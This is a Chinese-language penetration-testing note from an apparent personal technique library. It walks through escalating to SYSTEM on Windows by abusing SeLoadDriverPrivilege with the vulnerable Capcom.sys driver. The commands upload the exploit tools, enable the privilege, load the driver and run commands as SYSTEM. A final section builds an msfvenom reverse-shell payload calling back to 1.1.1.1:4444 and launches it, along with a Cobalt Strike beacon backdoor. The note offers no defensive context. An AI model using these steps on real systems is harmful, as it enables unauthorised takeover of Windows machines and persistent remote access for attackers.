---
{"created":"2024-12-04T22:03:41.393+08:00","tags":["SeLoadDriverPrivilege","windows提权"],"Type":"Note","dg-publish":true,"aliases":["SeLoadDriverPrivilege"],"permalink":"/24-渗透/渗透姿势库/SeLoadDriverPrivilege/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. 漏洞利用工具下载：
https://github.com/k4sth4/SeLoadDriverPrivilege

## 2. 利用教程：
### 2.1. 上传驱动文件和工具
将以下文件上传到目标机器的一个可写目录中：
- `eoploaddriver_x64.exe`
- `Capcom.sys`
- `ExploitCapcom.exe`
  ![assets/Pasted image 20241204220541.png](/img/user/24-%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/assets/Pasted%20image%2020241204220541.png)
### 2.2. 启用 SeLoadDriverPrivilege 权限
**如果权限启用了 可以忽略**
由于默认情况下 **`SeLoadDriverPrivilege`** 是禁用的，需要首先启用该权限
```shell
.\eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\Temp\\Capcom.sys
```

### 2.3. 通过 ExploitCapcom.exe 加载驱动
```bash
.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
```
![assets/Pasted image 20241204220714.png](/img/user/24-%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/assets/Pasted%20image%2020241204220714.png)

### 2.4. 特权用户执行命令
```shell
.\ExploitCapcom.exe EXPLOIT whoami
```
![assets/Pasted image 20241204220753.png](/img/user/24-%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/assets/Pasted%20image%2020241204220753.png)

## 3. 更多利用

### 3.1. msf回弹shell
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f exe > shell.exe

.\ExploitCapcom.exe EXPLOIT shell.exe
```

### 3.2. CS后门

```shell
.\ExploitCapcom.exe EXPLOIT beacon.exe
```